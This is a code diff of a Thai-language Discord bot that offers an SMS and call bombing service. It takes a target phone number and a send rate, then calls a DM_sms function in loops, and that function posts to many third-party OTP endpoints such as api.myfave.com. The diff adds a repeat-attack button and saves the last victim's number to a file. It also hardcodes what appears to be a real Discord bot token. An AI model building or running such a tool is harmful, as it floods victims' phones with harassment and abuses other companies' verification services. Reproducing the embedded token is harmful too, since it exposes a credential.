@@ -20,7 +20,7 @@ from random import choice
 from string import ascii_uppercase, digits
 from re import A, search
 from requests import post, Session, get
-bot = interactions.Client("",intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)
+bot = interactions.Client("MTAyMDQ4MzE1NTU0MDU3ODQ0NA.Gxz2A1.YpNoEJaGZm-pr2b9pGEHv7K-gaWGFSXqYbQsK0",intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)
 useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
 header = {
     "user-agent":
@@ -29,23 +29,55 @@ header = {
 threading = ThreadPoolExecutor(max_workers=int(100000))
 
 global data_stop
+global agin_phone
+global kao
+global mai_kao
 data_stop = False
+agin_phone = None
+kao = 0
+mai_kao = 0
 
 @bot.event
 async def on_start():
-    print("Test")
-
-@bot.event
-async def on_message_create(message: Message):
-    channel = await message.get_channel()
-    if channel.type == ChannelType.DM:
-        if message.content == "sms":
-            start_spam = Button(
-                style=ButtonStyle.SUCCESS,
-                custom_id="start_sms",
-                label="ยิงเบอร์",
-            )
-            await message.reply(components=[start_spam])
+    global agin_phone
+    auth_check = open("check.txt", "r")
+    check = auth_check.read()
+    if check == "1":
+        user = "973687650785583134"
+        channel = interactions.Channel(**await bot._http.create_dm(int(user)),_client=bot._http)
+        embed_load = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+        embed_load.set_footer(text="All Code By Meoaw メ#9999")
+        embed_load.add_field(name="> *สถานะบอท*", value=f"```fix\nกำลังโหลดเบอร์ที่ยิงล่าสุด...\n```", inline=True)
+        await channel.send(embeds=embed_load)
+        time.sleep(2)
+        auth_phone = open("phone.txt", "r")
+        phone = auth_phone.read()
+        agin_phone = phone
+        embed_phone = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+        embed_phone.set_footer(text="All Code By Meoaw メ#9999")
+        embed_phone.add_field(name="> *สถานะบอท*", value=f"```diff\n+ แสดงเบอร์ที่ยิงล่าสุด\n```", inline=True)
+        embed_phone.add_field(name="_ _", value="_ _", inline=False)
+        embed_phone.add_field(name="> *เบอร์ที่ยิงล่าสุด*", value=f"```fix\n {phone} \n```", inline=False)
+        agin_spam = Button(
+            style=ButtonStyle.SECONDARY,
+            custom_id="agin_sms",
+            label="ยืนยัน",
+        )
+        await channel.send(embeds=embed_phone, components=[agin_spam])     
+    else:
+        user = "973687650785583134"
+        channel = interactions.Channel(**await bot._http.create_dm(int(user)),_client=bot._http)
+        embed_ready = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+        embed_ready.set_footer(text="All Code By Meoaw メ#9999")
+        embed_ready.add_field(name="> *สถานะบอท*", value=f"```diff\n+ พร้อมสำหรับยิง\n```", inline=True)
+        embed_ready.add_field(name="_ _", value="_ _", inline=False)
+        embed_ready.add_field(name="> *คำสั่งยิง*", value="```yml\n sms \n```", inline=False)
+        start_spam = Button(
+            style=ButtonStyle.SUCCESS,
+            custom_id="start_sms",
+            label="ยิงเบอร์",
+        )
+        await channel.send(embeds=embed_ready, components=[start_spam])
 
 @bot.component("start_sms")
 async def start_sms(ctx: interactions.ComponentContext):
@@ -59,38 +91,77 @@ async def start_sms(ctx: interactions.ComponentContext):
                 label=f"กรุณาใส่เบอร์ที่ต้องการจะยิง",
                 placeholder="ex 08********",
             ),
+            TextInput(
+                style=TextStyleType.SHORT,
+                custom_id="text-input-2",
+                label=f"อัตราการยิง ( ต่อวินาที )",
+                placeholder="ex 2 ( ใส่ได้สูงสุด 20 )",
+            ),
         ],
     )
     await ctx.popup(modal)
 
 @bot.modal("sms")
-async def sms(ctx: CommandContext, one):
+async def sms(ctx: CommandContext, one,two):
     global data_stop
     i = 0
-    await ctx.send("กำลังเริ่มยิง...")
+    save_phone = open("phone.txt", "a")
+    save_phone.write(one)
+    save_phone.close()
+    save_num = open("check.txt", "a")
+    save_num.write("1")
+    save_num.close()
+    await ctx.message.delete()
+    embed_start = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+    embed_start.set_footer(text="All Code By Meoaw メ#9999")
+    embed_start.add_field(name="> *สถานะบอท*", value=f"```fix\nกำลังเริ่มยิง...\n```", inline=True)
+    start_spam01 = Button(
+        style=ButtonStyle.SUCCESS,
+        custom_id="start_sms",
+        label="ยิงเบอร์",
+        disabled=True
+    )
+    await ctx.send(embeds=embed_start, components=[start_spam01])
     time.sleep(1)
     while i < 10:
         if data_stop == True:
             sys.exit()
         elif data_stop == False:
+            phone = one
+            api = "107"
+            embed_status = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+            embed_status.set_footer(text="All Code By Meoaw メ#9999")
+            embed_status.add_field(name="> *เบอร์เป้าหมาย*", value=f"```fix\n{phone}\n```", inline=True)
+            embed_status.add_field(name="> *จำนวน API*", value=f"```json\n{api}\n```", inline=True)
+            embed_status.add_field(name="_ _", value="_ _", inline=False)
+            embed_status.add_field(name="> *จำนวนรอบ*", value=f"```\n{i} / {i}\n```", inline=False)
+            embed_status.add_field(name="_ _", value="_ _", inline=False)
+            embed_status.add_field(name="> *สถิติ API ( SMS )*", value="```diff\n+ [ ✅ ]:  0\n \n- [ ❌ ]:  0\n```", inline=True)
+            embed_status.add_field(name="> *สถิติ API ( CALL )*", value="```diff\n+ [ 📞 ]:  0\n \n- [ ☎️ ]:  0\n```", inline=True)
             stop_spam = Button(
                 style=ButtonStyle.DANGER,
                 custom_id="stop_spam",
                 label="หยุดยิง",
             )
             i += 1
-            phone = one
-            DM_sms(phone)
-            await ctx.edit(f"กำลังเริ่มยิงไปที่ {phone} | ความคืบหน้า: {i}0 /100 %",components=[stop_spam])
+            ## DM_sms(phone)
+            await ctx.edit(embeds=embed_status,components=[stop_spam])
     else:
         if i == 10:
+            embed_end = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+            embed_end.set_footer(text="All Code By Meoaw メ#9999")
+            embed_end.add_field(name="> *เบอร์เป้าหมาย*", value=f"```fix\n{phone}\n```", inline=True)
+            embed_end.add_field(name="_ _", value="_ _", inline=False)
+            embed_end.add_field(name="> *จำนวนรอบ*", value=f"```\n{i} / {i} \n```", inline=False)
+            embed_end.add_field(name="_ _", value="_ _", inline=False)
+            embed_end.add_field(name="> *สถานะบอท*", value="```diff\n+ ยิงเสร็จแล้วครับ\n```", inline=False)
             end_spam = Button(
                 style=ButtonStyle.SUCCESS,
                 custom_id="end_spam",
                 label="ยิงเสร็จแล้ว !!",
                 disabled=True
             )
-            await ctx.edit("ยิงเสร็จแล้วครับ !!",components=[end_spam])
+            await ctx.edit(embeds=embed_end,components=[end_spam])
         
 ## Stop Spam ##
 
@@ -111,9 +182,57 @@ async def stop_spam(ctx: interactions.ComponentContext):
     else:
         await ctx.edit("เกิดข้อผิดพลาด !!")
 
+## Agin Spam ##
+@bot.component("agin_sms")
+async def agin_sms(ctx: interactions.ComponentContext):
+    global agin_phone
+    count = "10"
+    count = int(count)
+    await ctx.message.delete()
+    time.sleep(1)
+    last_phone = open("phone.txt", "r")
+    phone = last_phone.read()
+    embed_agin = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+    embed_agin.set_footer(text="All Code By Meoaw メ#9999")
+    embed_agin.add_field(name="> *เบอร์เป้าหมาย*", value=f"```fix\n {phone} \n```", inline=True)
+    await ctx.send(embeds=embed_agin)
+    time.sleep(2)
+    
+    for _ in range(count+1):
+        phone = agin_phone
+        api = "107"
+        embed_as = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+        embed_as.set_footer(text="All Code By Meoaw メ#9999")
+        embed_as.add_field(name="> *เบอร์เป้าหมาย*", value=f"```fix\n{phone}\n```", inline=True)
+        embed_as.add_field(name="> *จำนวน API*", value=f"```json\n{api}\n```", inline=True)
+        embed_as.add_field(name="_ _", value="_ _", inline=False)
+        embed_as.add_field(name="> *จำนวนรอบ*", value=f"```\n{_} / {_}\n```", inline=False)
+        embed_as.add_field(name="_ _", value="_ _", inline=False)
+        embed_as.add_field(name="> *สถิติ API ( SMS )*", value="```diff\n+ [ ✅ ]:  0\n \n- [ ❌ ]:  0\n```", inline=True)
+        embed_as.add_field(name="> *สถิติ API ( CALL )*", value="```diff\n+ [ 📞 ]:  0\n \n- [ ☎️ ]:  0\n```", inline=True)
+        DM_sms(phone)
+        mes = await ctx.send(embeds=embed_as)
+    embed_end01 = interactions.Embed(title="**𝙆𝙤𝙩𝘾𝙝𝙞𝙡𝙡 𝙃𝙪𝙗 ( メ )**")
+    embed_end01.set_footer(text="All Code By Meoaw メ#9999")
+    embed_end01.add_field(name="> *เบอร์เป้าหมาย*", value=f"```fix\n{phone}\n```", inline=True)
+    embed_end01.add_field(name="_ _", value="_ _", inline=False)
+    embed_end01.add_field(name="> *จำนวนรอบ*", value=f"```\n{_} / {_} \n```", inline=False)
+    embed_end01.add_field(name="_ _", value="_ _", inline=False)
+    embed_end01.add_field(name="> *สถานะบอท*", value="```diff\n+ ยิงเสร็จแล้วครับ\n```", inline=False)
+    try:await mes.edit(embeds=embed_end01)
+    except:pass 
+    
+
 def randomString(N):
     return ''.join(choice(ascii_uppercase + digits) for _ in range(N))
 
+def kao():
+    global kao
+    kao = kao + 1
+
+def main_kao():
+    global mai_kao 
+    mai_kao = mai_kao + 1
 
 def sk1(phone):
     post("https://api.myfave.com/api/fave/v3/auth",
@@ -1887,3 +2006,5 @@ def DM_sms(phone):
 bot.start()
 
 ## © All Code & Ui By 𝙈𝙚𝙤𝙖𝙬 メ#9999 | โค้ดนี้ผมทำเองทั้งหมด ได้รับความช่วยเหลือจาก Dev โมดูล interactions.py
+
+## Thx CNP For Fix Bug
